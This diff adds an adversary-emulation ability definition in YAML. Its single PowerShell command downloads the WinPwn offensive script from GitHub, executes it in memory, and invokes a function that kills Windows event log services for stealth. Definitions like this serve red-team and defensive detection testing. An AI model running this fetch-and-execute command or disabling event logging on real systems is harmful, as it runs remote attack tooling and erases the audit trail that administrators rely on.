@@ -1,0 +1,18 @@
+---
+- id: ad234e628e19273343cc8c5061f0ab3d
+  name: WinPwn - Kill the event log services for stealth
+  description: Kill the event log services for stealth via function of WinPwn
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      psh:
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          inv-phantom -consoleoutput -noninteractive
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
